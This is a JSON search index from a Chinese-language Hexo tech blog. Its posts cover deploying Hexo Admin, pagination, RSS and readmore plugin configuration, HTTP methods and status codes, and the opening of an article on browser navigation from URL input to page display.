[{"title":"Hexo Admin 如何配合部署到线上","url":"/2024/04/03/Hexo-Admin-%E5%A6%82%E4%BD%95%E9%85%8D%E5%90%88%E9%83%A8%E7%BD%B2%E5%88%B0%E7%BA%BF%E4%B8%8A/","content":"<p>Hexo Admin 是一个为 Hexo 博客框架提供的一个管理界面，允许用户通过一个比较直观的 Web 界面来写文章和管理博客。若要将使用 Hexo Admin 编辑的博客部署到线上，需要遵循一些标准的步骤。以下是一个基本的流程：</p>\n<h3 id=\"安装-Hexo-Admin\"><a href=\"#安装-Hexo-Admin\" class=\"headerlink\" title=\"安装 Hexo Admin\"></a>安装 Hexo Admin</h3><p>安装 Hexo Admin 插件前，请确保你的 Hexo 博客已经在本地运行。</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">npm install --save hexo-admin</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后，重新启动你的 Hexo 服务器：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">hexo server</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在浏览器中打开 <code>http://localhost:4000/admin</code>，你应该能看到 Hexo Admin 的管理界面。</p>\n<h3 id=\"配置-Hexo-Admin\"><a href=\"#配置-Hexo-Admin\" class=\"headerlink\" title=\"配置 Hexo Admin\"></a>配置 Hexo Admin</h3><p>Hexo Admin 默认情况下没有密码保护，如果你希望你的编辑界面更加安全，可以在你的 <code>_config.yml</code> 配置文件中对 Hexo Admin 进行配置：</p>\n<figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">admin:</span></span><br><span class=\"line\">  <span class=\"attr\">username:</span> <span class=\"string\">myUsername</span></span><br><span class=\"line\">  <span class=\"attr\">password_hash:</span> <span class=\"string\">myPasswordHash</span></span><br><span class=\"line\">  <span class=\"attr\">secret:</span> <span class=\"string\">mySecret</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>password_hash</code> 是你密码的 bcrypt 哈希，可以使用在线 bcrypt 工具生成。<code>secret</code> 用于签署 cookie，可以是任何随机字符串。</p>\n<h3 id=\"部署博客到线上\"><a href=\"#部署博客到线上\" class=\"headerlink\" title=\"部署博客到线上\"></a>部署博客到线上</h3><p>Hexo 默认支持多种部署选项，如 Git、Heroku、Netlify、AWS S3 等，你可以使用以下命令来部署你的博客：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">hexo deploy</span><br></pre></td></tr></tbody></table></figure>\n\n<p>为了使用 <code>hexo deploy</code>，需要在你的博客根目录下的 <code>_config.yml</code> 文件中正确配置你的部署方法。例如，如果使用 Git 部署，你的配置可能如下所示：</p>\n<figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repo:</span> <span class=\"string\">&lt;repository</span> <span class=\"string\">url&gt;</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> [<span class=\"string\">branch</span>]</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这需要你已经设置了对应的 Git 仓库，并且你的本地环境能够推送到这个仓库。</p>\n<h3 id=\"自动化部署\"><a href=\"#自动化部署\" class=\"headerlink\" title=\"自动化部署\"></a>自动化部署</h3><p>很多人选择将博客托管在像 GitHub Pages 或 Netlify 这样的平台上，并设置持续集成来自动化部署过程。每当你向 Git 仓库推送新的内容，CI 工具会自动运行 <code>hexo generate</code> 生成网站静态文件，并将它们部署到服务器上。这样，你只需关注内容编辑，不用手动进行部署。</p>\n<p>如果你在本机上使用 Hexo Admin 编辑内容，你可以在编辑完成后使用 Git 命令提交并推送更改到远端仓库：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">\"Add new post\"</span></span><br><span class=\"line\">git push origin master</span><br></pre></td></tr></tbody></table></figure>\n\n<p>之后，你配置的 CI 工具（如 Travis CI、GitHub Actions 等）会自动捕捉到新的提交，并开始部署流程。</p>\n<p>请注意，留意 Hexo Admin 插件是否开放于公共网络。若你的 Hexo server 在生产模式对外开放，记得配置安全措施，如密码保护以防止未经授权的访问。</p>\n","categories":["hexo"],"tags":["前端","hexo"]},{"title":"Hexo 内容分页配置","url":"//hexo/config/pagination.html","content":"<h4 id=\"per-page-config-yml\"><a href=\"#per-page-config-yml\" class=\"headerlink\" title=\"per_page _config.yml\"></a>per_page _config.yml</h4><figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Pagination</span></span><br><span class=\"line\"><span class=\"comment\">## Set per_page to 0 to disable pagination</span></span><br><span class=\"line\"><span class=\"attr\">per_page:</span> <span class=\"number\">20</span> <span class=\"comment\"># 分页条数</span></span><br><span class=\"line\"><span class=\"attr\">pagination_dir:</span> <span class=\"string\">page</span> <span class=\"comment\"># 自定义分页路径</span></span><br></pre></td></tr></tbody></table></figure>\n\n","categories":["前端","框架","Hexo"],"tags":["前端","Hexo","Pagination"]},{"title":"Hexo 开启公众号引流工具","url":"//hexo/config/readmore.html","content":"<h3 id=\"配置博客信息\"><a href=\"#配置博客信息\" class=\"headerlink\" title=\"配置博客信息\"></a>配置博客信息</h3><p><img data-src=\"https://pic.imgdb.cn/item/6535dc4dc458853aef3ec866.jpg\"></p>\n<h3 id=\"hexo-config-yml-配置\"><a href=\"#hexo-config-yml-配置\" class=\"headerlink\" title=\"hexo _config.yml 配置\"></a>hexo _config.yml 配置</h3><figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">plugins:</span></span><br><span class=\"line\">  <span class=\"attr\">readmore:</span></span><br><span class=\"line\">    <span class=\"attr\">blogId:</span> <span class=\"number\">31652</span><span class=\"number\">-1697970027416</span><span class=\"number\">-119</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">BaType</span></span><br><span class=\"line\">    <span class=\"attr\">qrcode:</span> <span class=\"string\">https://i.postimg.cc/BnGK06H2/qrcode-for-gh-50f2ce2229c5-258.jpg</span></span><br><span class=\"line\">    <span class=\"attr\">keyword:</span> <span class=\"number\">666</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中，配置参数含义如下:</p>\n<ul>\n<li>blogId : [必选] OpenWrite 后台申请的博客唯一标识，例如：31652-1697970027416-119</li>\n<li>name : [必选] OpenWrite 后台申请的博客名称，例如：BaType</li>\n<li>qrcode : [必选] OpenWrite 后台申请的微信公众号二维码，例如:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLnBvc3RpbWcuY2MvQm5HSzA2SDIvcXJjb2RlLWZvci1naC01MGYyY2UyMjI5YzUtMjU4LmpwZw==\">https://i.postimg.cc/BnGK06H2/qrcode-for-gh-50f2ce2229c5-258.jpg<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li>keyword : [必选] OpenWrite 后台申请的微信公众号后台回复关键字，例如：666</li>\n</ul>\n<h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><p><code>npm install hexo-plugin-readmore --save</code></p>\n<h3 id=\"展示\"><a href=\"#展示\" class=\"headerlink\" title=\"展示\"></a>展示</h3><p><img data-src=\"https://pic.imgdb.cn/item/6535dddec458853aef428ef6.jpg\"></p>\n","categories":["前端","框架","Hexo"],"tags":["前端","Hexo","ReadMore"]},{"title":"Hexo 开启 RSS","url":"//hexo/config/rss.html","content":"<h5 id=\"安装hexo-generator-feed-插件\"><a href=\"#安装hexo-generator-feed-插件\" class=\"headerlink\" title=\"安装hexo-generator-feed 插件\"></a>安装 hexo-generator-feed 插件</h5><h6 id=\"npm\"><a href=\"#npm\" class=\"headerlink\" title=\"npm\"></a>npm</h6><p><code>npm install hexo-generator-feed -d</code></p>\n<h6 id=\"yarn\"><a href=\"#yarn\" class=\"headerlink\" title=\"yarn\"></a>yarn</h6><p><code>yarn add hexo-generator-feed</code></p>\n<h5 id=\"配置-config-themes-yml\"><a href=\"#配置-config-themes-yml\" class=\"headerlink\" title=\"配置_config.[themes].yml\"></a>配置_config.[themes].yml</h5><h6 id=\"增加导航栏菜单\"><a href=\"#增加导航栏菜单\" class=\"headerlink\" title=\"增加导航栏菜单\"></a>增加导航栏菜单</h6><figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">RSS:</span> <span class=\"string\">/atom.xml</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-rss</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h6 id=\"参数配置\"><a href=\"#参数配置\" class=\"headerlink\" title=\"参数配置\"></a>参数配置</h6><figure class=\"highlight yml\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">feed:</span></span><br><span class=\"line\">    <span class=\"attr\">type:</span> <span class=\"string\">atom</span>  <span class=\"comment\"># 类型为atom</span></span><br><span class=\"line\">    <span class=\"attr\">path:</span> <span class=\"string\">atom.xml</span> <span class=\"comment\"># 访问路径</span></span><br><span class=\"line\">    <span class=\"attr\">limit:</span> <span class=\"number\">20</span> <span class=\"comment\"># 分页</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n<h5 id=\"清除重启\"><a href=\"#清除重启\" class=\"headerlink\" title=\"清除重启\"></a>清除重启</h5><p><code>hexo clean &amp;&amp; hexo generate</code></p>\n<h5 id=\"页面效果\"><a href=\"#页面效果\" class=\"headerlink\" title=\"页面效果\"></a>页面效果</h5><p><img data-src=\"https://pic.imgdb.cn/item/6533d473c458853aefb79c42.png\" alt=\"atom.xml\"></p>\n","categories":["前端","框架","Hexo"],"tags":["前端","Hexo","RSS"]},{"title":"HTTP 详解","url":"//browser/protocol/http.html","content":"<h3 id=\"HTTP（Hypertext-Transfer-Protocol）基本信息\"><a href=\"#HTTP（Hypertext-Transfer-Protocol）基本信息\" class=\"headerlink\" title=\"HTTP（Hypertext Transfer Protocol）基本信息\"></a>HTTP（Hypertext Transfer Protocol）基本信息</h3><p>HTTP（Hypertext Transfer Protocol）是一种用于在网络上传输超文本数据的协议。它是一种客户端 - 服务器协议，客户端发送请求，服务器返回响应。HTTP 是 Web 的基础，用于在 Web 浏览器和 Web 服务器之间传输数据。</p>\n<p>以下是 HTTP 的一些关键概念和详解：</p>\n<ol>\n<li><p>请求和响应</p>\n<p> HTTP 通信是基于请求 - 响应模型。客户端发送 HTTP 请求到服务器，服务器处理请求并返回 HTTP 响应。</p>\n</li>\n<li><p>URL（Uniform Resource Locator）</p>\n<p> URL 是用于标识资源的地址。它由协议类型（如 http:// 或 https://）、域名或 IP 地址、端口号（可选）、路径和查询参数组成。<br> URL（Uniform Resource Locator）是用于标识资源的地址。</p>\n<p> 下面是一个 URL 的图解示例：</p>\n <figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">┌─────────────────────────────────────────────────────┐</span><br><span class=\"line\">│                        URL                          │</span><br><span class=\"line\">├───────────┬─────────────┬─────────┬───────┬───────┤</span><br><span class=\"line\">│  协议类型   │    域名/IP   │ 端口号  │  路径  │ 查询参数 │</span><br><span class=\"line\">├───────────┴─────────────┴─────────┴───────┴───────┤</span><br><span class=\"line\">│                     示例：                           │</span><br><span class=\"line\">│   https://www.example.com:8080/path/to/resource?q=1 │</span><br><span class=\"line\">└─────────────────────────────────────────────────────┘</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>协议类型（Protocol）：指定使用的协议，如 HTTP、HTTPS、FTP 等。</li>\n<li>域名或 IP 地址（Domain/IP）：标识资源所在的主机名或 IP 地址。</li>\n<li>端口号（Port）：可选项，用于指定与服务器通信的端口号，默认使用协议的默认端口号（如 HTTP 的默认端口号是 80）。</li>\n<li>路径（Path）：指定资源在服务器上的路径，用斜杠（/）分隔不同的目录或文件。</li>\n<li>查询参数（Query Parameters）：可选项，用于向服务器传递额外的参数，以键值对的形式出现，多个参数使用 &amp; 符号分隔。</li>\n</ul>\n<p> 在示例中，URL 是以 HTTPS 协议访问的，域名为<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbSzkvb/nlKjkuoY4MDgw56uv5Y+j5Y+3Lui3r+W+hOS4ui9wYXRoL3RvL3Jlc291cmNlJUVGJUJDJThDJUU2JTlGJUE1JUU4JUFGJUEyJUU1JThGJTgyJUU2JTk1JUIwJUU0JUI4JUJBcT0xJUUzJTgwJTgy\"> www.example.com，使用了 8080 端口号。路径为 /path/to/resource，查询参数为 q=1。<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p> URL 的结构可以根据不同的协议和应用场景有所变化，但基本的组成部分是协议类型、域名或 IP 地址、端口号、路径和查询参数。通过 URL，我们可以定位和访问互联网上的各种资源。</p>\n</li>\n<li><p>HTTP 方法</p>\n<p> HTTP 定义了一组方法，用于指定对资源的操作类型。常见的 HTTP 方法有 GET（获取资源）、POST（提交数据创建资源）、PUT（更新资源）、DELETE（删除资源）、PATCH（更新资源）、OPTIONS（获取资源支持的 HTTP 方法）、HEAD（获取资源头信息）。</p>\n<ul>\n<li><p><strong>GET</strong>：用于获取资源。客户端发送 GET 请求到服务器，服务器返回请求的资源。GET 请求通常不应该对服务器端产生副作用，即不应该修改服务器上的数据。</p>\n</li>\n<li><p><strong>POST</strong>：用于提交数据创建资源。客户端发送 POST 请求到服务器，请求创建一个新的资源。POST 请求通常用于提交表单数据、上传文件等操作。</p>\n</li>\n<li><p><strong>PUT</strong>：用于更新资源。客户端发送 PUT 请求到服务器，请求更新指定的资源。PUT 请求应该是幂等的，即多次执行相同的 PUT 请求结果应该是一致的。</p>\n</li>\n<li><p><strong>DELETE</strong>：用于删除资源。客户端发送 DELETE 请求到服务器，请求删除指定的资源。</p>\n</li>\n<li><p><strong>PATCH</strong>：用于局部更新资源。客户端发送 PATCH 请求到服务器，请求对指定的资源进行部分更新。</p>\n</li>\n<li><p><strong>HEAD</strong>：类似于 GET 请求，但只返回响应头信息，不返回响应体。HEAD 请求常用于获取资源的元数据，如文件大小、修改时间等，而不需要获取完整的资源内容。</p>\n</li>\n<li><p><strong>OPTIONS</strong>：用于获取服务器支持的 HTTP 方法和其他选项。客户端发送 OPTIONS 请求到服务器，服务器返回支持的方法和其他信息，用于客户端了解服务器的功能和配置</p>\n</li>\n</ul>\n</li>\n<li><p>请求头</p>\n<p> HTTP 请求包含一组请求头，用于传递关于请求的元数据，如 User-Agent（客户端标识）、Content-Type（请求体的数据类型）、Authorization（身份验证信息）等。</p>\n</li>\n<li><p>响应头</p>\n<p> HTTP 响应也包含一组响应头，用于传递关于响应的元数据，如 Content-Type（响应体的数据类型）、Content-Length（响应体长度）、Cache-Control（缓存策略）等。</p>\n</li>\n<li><p>状态码</p>\n<p> HTTP 响应包含一个状态码，用于表示请求的处理结果。常见的状态码有 200（成功）、404（资源未找到）、500（服务器内部错误）等。</p>\n<p> 以下是 HTTP 状态码的分类：</p>\n<ul>\n<li>1xx（信息性状态码）：表示接收的请求正在处理。</li>\n<li>2xx（成功状态码）：表示请求成功被服务器接收、理解、并接受。</li>\n<li>3xx（重定向状态码）：需要后续操作才能完成这一请求。</li>\n<li>4xx（客户端错误状态码）：表示请求包含语法错误或无法完成。</li>\n<li>5xx（服务器错误状态码）：服务器在处理请求的过程中发生了错误。</li>\n</ul>\n</li>\n<li><p>请求体和响应体</p>\n<p> 某些 HTTP 请求和响应可能包含一个可选的消息体，用于传递数据。请求体通常用于 POST 或 PUT 请求发送数据，而响应体用于返回请求的结果数据。</p>\n</li>\n<li><p>Cookie</p>\n<p> Cookie 是一种在客户端和服务器之间传递的小型数据，用于跟踪和识别用户。服务器可以通过设置响应头中的 Set-Cookie 字段来发送 Cookie 给客户端，客户端在后续的请求中会自动将 Cookie 包含在请求头中发送给服务器。</p>\n</li>\n<li><p>缓存</p>\n<p> HTTP 支持缓存机制，可以减少对服务器的请求次数，提高性能。服务器可以通过设置响应头中的 Cache-Control 字段来控制缓存策略，客户端可以通过设置请求头中的 If-Modified-Since 或 If-None-Match 字段来验证缓存的有效性。</p>\n</li>\n</ol>\n<p>HTTP 是一个无状态协议，每个请求和响应之间是相互独立的。为了跟踪用户状态，HTTP 引入了 Cookie 等机制。此外，HTTP 还支持 HTTPS（HTTP Secure）协议，通过加密和身份验证来提供更安全的通信。</p>\n<h3 id=\"HTTP-报文\"><a href=\"#HTTP-报文\" class=\"headerlink\" title=\"HTTP 报文\"></a>HTTP 报文</h3><p>HTTP 协议的请求报文和响应报文的基本结构相同，由三大部分组成：</p>\n<ul>\n<li>起始行（start line）： 描述请求或相应的基本信息；</li>\n<li>头部字段集合（header）：使用  <code>key-value</code> 形式更详细地说明报文</li>\n<li>消息体（entity）：实际传输的数据，它不一定是纯文本，可以是图片、视频等二进制数据。</li>\n</ul>\n<p>HTTP 报文由请求报文和响应报文两种格式组成，它们的基本结构如下：</p>\n<ol>\n<li>请求报文格式：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">&lt;方法&gt; &lt;URL&gt; &lt;协议版本&gt;  : 请求行</span><br><span class=\"line\">&lt;请求头部字段1&gt;: &lt;值1&gt;</span><br><span class=\"line\">&lt;请求头部字段2&gt;: &lt;值2&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;空行&gt;</span><br><span class=\"line\">&lt;请求体&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li><p><strong>请求行</strong></p>\n<ul>\n<li>方法：指定请求的方法，如 GET、POST 等。</li>\n<li>URL：请求的目标资源的 URL。</li>\n<li>协议版本：使用的 HTTP 协议版本，如 HTTP/1.1。</li>\n</ul>\n</li>\n<li><p><strong>请求头部字段</strong></p>\n<ul>\n<li>包含了请求的各种附加信息，如 User-Agent、Content-Type 等。</li>\n</ul>\n</li>\n<li><p><strong>空行</strong></p>\n<ul>\n<li>用于分隔请求头部和请求体。</li>\n</ul>\n</li>\n<li><p><strong>请求体</strong></p>\n<ul>\n<li>可选项，包含了请求的主体内容，如 POST 请求中的表单数据、PUT 请求中的更新内容等。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>响应报文格式：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">&lt;协议版本&gt; &lt;状态码&gt; &lt;状态码描述&gt;: 响应行</span><br><span class=\"line\">&lt;响应头部字段1&gt;: &lt;值1&gt;</span><br><span class=\"line\">&lt;响应头部字段2&gt;: &lt;值2&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;空行&gt;</span><br><span class=\"line\">&lt;响应体&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li><p><strong>响应行</strong></p>\n<ul>\n<li>协议版本：使用的 HTTP 协议版本，如 HTTP/1.1。</li>\n<li>状态码：表示服务器对请求的处理结果，如 200 表示成功，404 表示资源未找到等。</li>\n<li>状态码描述：对状态码的简短描述。</li>\n</ul>\n</li>\n<li><p><strong>响应头部字段</strong></p>\n<ul>\n<li>包含了响应的各种附加信息，如 Content-Type、Content-Length 等。</li>\n</ul>\n</li>\n<li><p><strong>空行</strong></p>\n<ul>\n<li>用于分隔响应头部和响应体。</li>\n</ul>\n</li>\n<li><p><strong>响应体</strong></p>\n<ul>\n<li>包含了响应的主体内容，如 HTML 页面、JSON 数据等。</li>\n</ul>\n</li>\n</ul>\n<p>HTTP 报文的格式是文本格式，使用 ASCII 编码。请求报文由客户端发送到服务器，响应报文由服务器返回给客户端。报文中的请求头部和响应头部字段提供了关于请求和响应的元数据信息，而请求体和响应体则包含了具体的数据内容。通过这种报文格式，客户端和服务器可以进行有效的通信和数据交换。</p>\n<h3 id=\"状态码\"><a href=\"#状态码\" class=\"headerlink\" title=\"状态码\"></a>状态码</h3><h4 id=\"1xx（信息性状态码）\"><a href=\"#1xx（信息性状态码）\" class=\"headerlink\" title=\"1xx（信息性状态码）\"></a>1xx（信息性状态码）</h4><p><code>1xx</code> 状态码是 <code>HTTP</code> 协议中的信息性状态码，表示请求已被接受，但还未完成。通常情况下，服务器会在响应中发送一些额外的信息，以帮助客户端了解请求的状态。</p>\n<p>常见的 1xx 状态码包括：</p>\n<ul>\n<li>100 Continue（继续）：表示服务器已经收到请求的头部，并且客户端应该继续发送请求的主题部分。</li>\n<li>101 Switching Protocols（切换协议）：表示服务器已经理解客户端的请求，并将切换到不同的协议，如从 <code>HTTP</code> 切换到 <code>WebSocket</code>。 </li>\n<li>102 Processing（处理中）：表示服务器正在处理请求，但尚未完成。</li>\n<li>103 Early Hints（早期提示）：表示服务器已经开始处理请求，但仍在生成响应的过程中，可以在响应头部发送一些提示信息。</li>\n</ul>\n<p>这些 1xx 状态码主要用于在请求 - 响应过程中提供一些中间状态信息，以便客户端和服务器能够更好地进行通信和处理。</p>\n<h4 id=\"2xx（成功状态码）\"><a href=\"#2xx（成功状态码）\" class=\"headerlink\" title=\"2xx（成功状态码）\"></a>2xx（成功状态码）</h4><p>2xx 状态码是 HTTP 协议中的成功状态码，表示服务器成功处理了客户端的请求。</p>\n<p>以下是一些常见的 2xx 状态码：</p>\n<ul>\n<li><p>200 OK（成功）：表示请求已成功处理，并返回了请求的内容。</p>\n</li>\n<li><p>201 Created（已创建）：表示请求已成功处理，并在服务器上创建了新的资源。</p>\n</li>\n<li><p>202 Accepted（已接受）：表示服务器已经接受了请求，但尚未完成处理。通常用于异步操作，告知客户端请求已接受，但处理尚未完成。</p>\n</li>\n<li><p>204 No Content（无内容）：表示服务器成功处理了请求，但没有返回任何内容。通常用于不需要返回具体内容的请求，如 DELETE 请求。</p>\n</li>\n</ul>\n<p>这些 2xx 状态码表示客户端的请求已经成功处理，并且服务器能够提供相应的响应。不同的 2xx 状态码可以提供不同的信息，客户端可以根据这些状态码来判断请求的结果和下一步的操作。</p>\n<h4 id=\"3xx（重定向状态码）\"><a href=\"#3xx（重定向状态码）\" class=\"headerlink\" title=\"3xx（重定向状态码）\"></a>3xx（重定向状态码）</h4><p>3xx 状态码是 HTTP 协议中的重定向状态码，用于指示客户端需要采取进一步的操作来完成请求。</p>\n<p>以下是一些常见的 3xx 状态码：</p>\n<ul>\n<li>300 Multiple Choices（多种选择）：表示请求有多个可供选择的响应，客户端可以选择其中一个进行访问；</li>\n<li>301 Moved Permanently（永久重定向）：表示请求的资源以永久移动到新的 <code>URL</code>，客户端应该使用新的 <code>URL</code> 进行访问；</li>\n<li>302 Found（临时重定向）：表示请求的资源已临时移动到新的 <code>URL</code> ，客户端应该使用新的 <code>URL</code> 进行访问。与 <code>301</code> 状态码类似，但是 <code>302</code> 状态码表示重定向是临时的；</li>\n<li>304 Not Modified（未修改）：表示客户端发送的条件请求（如带有 <code>If-Modified-Since</code> 头部）的资源未发生修改，可以使用缓存的版本；</li>\n<li>307 Temporary Redirect（临时重定向）：与 <code>302</code> 状态码类似，表示请求的资源已临时移动到新的 <code>URL</code> ，客户端应该使用新的 <code>URL</code> 进行访问；</li>\n<li>308 Permanent Redirect（永久重定向）：与 <code>301</code> 状态码类似，表示请求的资源已永久移动到新的 <code>URL</code> ，客户端应该使用新的 <code>URL</code> 进行访问。</li>\n</ul>\n<p>这些 3xx 状态码用于在客户端和服务器之间进行资源重定向，指示客户端采取进一步的操作来获取所需的资源。具体使用哪个 3xx 状态码取决于服务器的配置和需求。</p>\n<h4 id=\"4xx（客户端错误状态码）\"><a href=\"#4xx（客户端错误状态码）\" class=\"headerlink\" title=\"4xx（客户端错误状态码）\"></a>4xx（客户端错误状态码）</h4><p><code>4xx</code> 状态码是 <code>HTTP</code> 协议中的客户端错误码，表示客户端发送的请求有错误。</p>\n<p>以下是一些常见的 <code>4xx</code> 状态码:</p>\n<ul>\n<li>400 Bad Request（错误请求）： 表示服务器无法理解客户端发送的请求，通常是由于请求语法错误或缺少不要的参数；</li>\n<li>401 Unauthorized（未授权）：表示客户端请求需要进行身份验证，但未提供有效的身份验证凭证；</li>\n<li>403 Forbidden（禁止访问）： 表示客户端请求的资源被服务器拒绝访问，通常是由于权限限制或者访问被禁止；</li>\n<li>404 Not Found（未找到）：表示客户端请求的资源在服务器上未找到；</li>\n<li>405 Method Not Allowed（方法不允许）：表示客户端使用了服务器不支持的请求方法；</li>\n<li>408 Request Timeout（请求超时）：表示客户端发送的请求在服务器等待时间内没有得到响应。</li>\n</ul>\n<p>这些 4xx 状态码指示客户端发送的请求存在错误或无法成功处理。客户端可以根据这些状态码来判断请求的错误类型，并采取相应的操作进行修正或处理。</p>\n<h4 id=\"5xx（服务端错误状态码）\"><a href=\"#5xx（服务端错误状态码）\" class=\"headerlink\" title=\"5xx（服务端错误状态码）\"></a>5xx（服务端错误状态码）</h4><p><code>5xx</code> 状态码是 <code>HTTP</code> 协议中的服务端错误状态码，表示服务器在处理请求时发生了错误。</p>\n<p>以下是一些常见的 <code>5xx</code> 状态码：</p>\n<ul>\n<li>500 Internal Server Error（服务器内部错误）：表示服务器在处理请求时发生了未知的内部错误；</li>\n<li>501 Not Implemented（未实现）：表示服务器不支持客户端的功能或者请求的方法；</li>\n<li>502 Bad Gateway（错误的网关）：表示服务器作为网关或代理时从上游服务器接收到无效的响应；</li>\n<li>503 Service Unavailable（服务器不可用）：表示服务器当前无法处理请求，通常是由于服务器过载或者维护；</li>\n<li>504 Gateway Timeout（网关超时）：表示服务器作为网关或代理时未及时从上游服务器接收到响应。</li>\n</ul>\n<p>这些 5xx 状态码指示服务器在处理请求时出现了错误或无法提供所需的服务。客户端可以根据这些状态码来判断服务器的状态，并采取相应的操作，如等待一段时间后重试请求或联系服务器管理员进行修复。</p>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","http"]},{"title":"导航流程：从输入 URL 到页面展示，这中间发生了什么？","url":"//browser/protocol/http-navigation.html","content":"<p>“在浏览器里，从输入 URL 到页面展示，这中间发生了什么？” 这是一道经典的面试题，能比较全面地考察应聘者知识的掌握程度，其中涉及到了网络、操作系统、Web 等一系列的知识。所以我在面试应聘者时也必问这道题，但遗憾的是大多数人只能回答其中部分零散的知识点，并不能将这些知识点串联成线，无法系统而又全面地回答这个问题。</p>\n<p>那么今天我们就一起来探索下这个流程，下图是我梳理出的 “从输入 URL 到页面展示完整流程示意图”：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661ccfd568eb9357138671dd.png\" alt=\"从输入URL到页面展示完整流程示意图\"></p>\n<p>从图中可以看出，整个过程需要各个进程之间的配合，所以在开始正式流程之前，我们还是先来快速回顾一下浏览器进程、渲染进程和网络进程的主要职责：</p>\n<ul>\n<li>浏览器进程主要负责用户交互、子进程管理和文件储存等功能；</li>\n<li>网络进程是面向渲染进程和浏览器进程等提供网络下载功能；</li>\n<li>渲染进程的主要责任是从网络下载的 HTML、JavaScript、CSS、图片等资源解析为可以显示和交互的页面。因为渲染进程所有的内容都是通过网络获取的，会存在一些恶意代码利用浏览器漏洞对系统进行攻击，所以运行在渲染进程里面的代码是不被信任的。这是因为 Chrome 会让渲染进程运行在安全沙箱里的原因，就是为了保证系统的安全。</li>\n</ul>\n<p>回顾了浏览器的进程架构后，我们在结合上图来看下这个完整的流程，可以看出，整个流程包含了许多步骤，我把其中的和信节点用蓝色背景标记出来了。这个过程可以大致描述为如下。</p>\n<ul>\n<li>首先，浏览器进程收到用户输入的 URL 请求，浏览器进程便将该 URL 转发给网络进程；</li>\n<li>然后，在网络进程中发起真正的 URL 请求；</li>\n<li>接着网络进程接收到了响应头数据，便解析响应头数据，并将数据转发给浏览器进程；</li>\n<li>浏览器进程接收到网络进程的数据之后，发送 “提交导航（CommitNavigation）” 消息到渲染进程；</li>\n<li>渲染进程接收到 “接收导航” 的消息之后，便开始准备接收 HTML 数据，接收数据的方式是直接和网络进程建立数据管道；</li>\n<li>最后渲染进程会向浏览器进程 “确认提交”，这便是告诉浏览器进程：“已经准备好接受和解析页面数据了”；</li>\n<li>浏览器接收到渲染进程 “提交文档” 的消息后，便开始移除之前的旧文档的文档，然后更新浏览器进程中的页面状态。<br>这其中，<strong>用户发出 URL 请求到页面开始解析的这个过程，就叫做导航</strong>。</li>\n</ul>\n<h2 id=\"从URL输入到页面展示\"><a href=\"#从URL输入到页面展示\" class=\"headerlink\" title=\"从URL输入到页面展示\"></a>从 URL 输入到页面展示</h2><p>现在我们知道了浏览器几个主要进程的职责，还有在导航过程中需要经历的几个主要的阶段，下面就来详细分析下这些阶段，同时就解答了开头所说的那道经典的面试题。</p>\n<h3 id=\"用户输入\"><a href=\"#用户输入\" class=\"headerlink\" title=\"用户输入\"></a>用户输入</h3><p>当用户在地址栏中输入一个人查询关键字时，地址栏会判断当前输入的关键字时<strong>搜索内容</strong>，还是 <strong>URL 请求</strong>。</p>\n<ul>\n<li>如果是搜索内容，地址栏会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL；</li>\n<li>如果判断输入内容符合 URL 规则，比如输入的是 <code>time.geekbang.org</code>，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL，如 <code>https://time.geekbang.org</code>。</li>\n</ul>\n<p>当用户输入关键字并键入回车后，这意味着当前页面将要被替换成新的页面，不过在这个流程继续之前，浏览器还给了当前页面一次执行 <code>beforeunload</code> 事件的机会，<code>beforeunload</code> 事件允许在页面退出之前执行一些数据清理操作，还可以询问用户是否要离开当前页面，比如前页面可能有未提交完成的表单等情况，因此用户可以通过 <code>beforeunload</code> 事件来取消导航，让浏览不再执行任何后续工作。</p>\n<p>当前浏览器没有监听 <code>beforeunload</code> 